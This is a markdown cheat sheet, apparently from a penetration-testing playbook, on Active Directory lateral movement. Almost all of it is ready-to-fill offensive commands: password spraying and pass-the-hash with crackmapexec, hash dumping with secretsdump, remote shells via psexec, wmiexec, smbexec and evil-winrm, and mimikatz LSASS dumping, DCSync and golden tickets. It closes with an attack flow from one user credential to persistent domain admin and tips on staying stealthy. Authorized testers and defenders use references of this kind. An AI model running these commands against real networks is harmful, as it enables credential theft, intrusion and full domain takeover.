# Active Directory & Windows Lateral Movement

> Covers: bloodhound, crackmapexec, evil-winrm, impacket (psexec, wmiexec, smbexec, secretsdump), mimikatz, pth_tools

## Risk Level: HIGH — Domain-wide impact possible

---

## crackmapexec (CME) — Swiss Army Knife for AD

### Why
Tests credentials across multiple protocols and hosts simultaneously. One tool for SMB, WinRM, LDAP, MSSQL, SSH.

### When to Use
| Signal | Action |
|---|---|
| Creds found, AD environment | Spray across network |
| Need to check admin access | CME shows Pwn3d! |
| Need to enum shares/users | CME does it at scale |
| Multiple Windows hosts | CME parallelizes |

### Common Invocations
```bash
# Check creds against SMB
crackmapexec smb <target/cidr> -u <user> -p <password>

# Password spray
crackmapexec smb <target/cidr> -u users.txt -p 'Password1'

# Pass-the-hash
crackmapexec smb <target/cidr> -u <user> -H <ntlm_hash>

# Enum shares
crackmapexec smb <target/cidr> -u <user> -p <pass> --shares

# Enum users
crackmapexec smb <target/cidr> -u <user> -p <pass> --users

# Dump SAM
crackmapexec smb <target> -u <user> -p <pass> --sam

# Execute command
crackmapexec smb <target> -u <user> -p <pass> -x "whoami"

# WinRM check
crackmapexec winrm <target> -u <user> -p <pass>

# MSSQL
crackmapexec mssql <target> -u <user> -p <pass>
```

---

## bloodhound — AD Attack Path Mapper

### When to Use
| Signal | Action |
|---|---|
| Domain creds obtained | Map AD attack paths |
| Need to find privesc path | Shortest path to DA |
| Complex AD environment | Visualize relationships |

### Collection
```bash
# Collect data (run from domain-joined or with creds)
bloodhound-python -u <user> -p <pass> -d <domain> -c all -ns <dc_ip>

# Then import into BloodHound GUI
# Look for: shortest path to Domain Admin
```

---

## Impacket Suite — Python AD Tools

### secretsdump — Credential Extraction
```bash
# Dump SAM/LSA/NTDS
secretsdump.py <domain>/<user>:<pass>@<target>

# With hash
secretsdump.py -hashes :<ntlm_hash> <domain>/<user>@<target>

# From NTDS.dit (offline)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### psexec — Remote Shell (SMB)
```bash
# With password
psexec.py <domain>/<user>:<pass>@<target>

# With hash (pass-the-hash)
psexec.py -hashes :<ntlm_hash> <domain>/<user>@<target>
```

### wmiexec — Remote Shell (WMI)
```bash
# More stealthy than psexec
wmiexec.py <domain>/<user>:<pass>@<target>
```

### smbexec — Remote Shell (SMB, no disk write)
```bash
# Doesn't drop binary on disk
smbexec.py <domain>/<user>:<pass>@<target>
```

---

## evil-winrm — WinRM Shell

### When to Use
| Signal | Action |
|---|---|
| Port 5985/5986 open | WinRM available |
| Admin creds for Windows | Get shell via WinRM |
| Need PowerShell | evil-winrm gives PS shell |

### Common Invocations
```bash
# With password
evil-winrm -i <target> -u <user> -p <password>

# With hash
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# Upload/download files
*Evil-WinRM* > upload localfile.exe
*Evil-WinRM* > download C:\file.txt
```

---

## mimikatz — Credential Extraction (Post-Exploitation)

### When to Use
| Signal | Action |
|---|---|
| Admin shell on Windows | Dump creds from memory |
| Need to extract hashes | LSASS dump |
| Need Kerberos tickets | Golden/silver ticket |

### Common Commands
```
# Dump logon passwords
mimikatz# sekurlsa::logonpasswords

# Dump SAM
mimikatz# lsadump::sam

# DCSync (domain admin required)
mimikatz# lsadump::dcsync /user:krbtgt

# Pass-the-hash
mimikatz# sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash>
```

---

## AD Attack Flow

```
1. INITIAL CREDS (any domain user)
   │
2. ENUMERATE
   ├─ crackmapexec smb <range> -u <user> -p <pass>  → find accessible hosts
   ├─ bloodhound → map attack paths
   └─ crackmapexec --users/--shares → harvest data
   │
3. ESCALATE
   ├─ secretsdump → dump hashes from accessible hosts
   ├─ crackmapexec --sam → local admin hashes
   ├─ mimikatz → logon passwords from memory
   └─ bloodhound path → follow to Domain Admin
   │
4. MOVE LATERALLY
   ├─ psexec/wmiexec/smbexec → shell on new hosts
   ├─ evil-winrm → PowerShell on WinRM hosts
   ├─ pass-the-hash → reuse NTLM hashes
   └─ crackmapexec → spray new creds across network
   │
5. DOMAIN ADMIN
   ├─ secretsdump on DC → full NTDS dump
   ├─ mimikatz DCSync → krbtgt hash
   └─ Golden ticket → persistent domain access
```

## Junior Mistakes

- Running secretsdump without admin access (will fail)
- Using psexec when wmiexec would be stealthier
- Not using pass-the-hash (cracking not always necessary)
- Spraying passwords without checking lockout policy
- Running BloodHound collector without understanding noise generated
- Forgetting that CME's "Pwn3d!" means local admin, not just valid creds
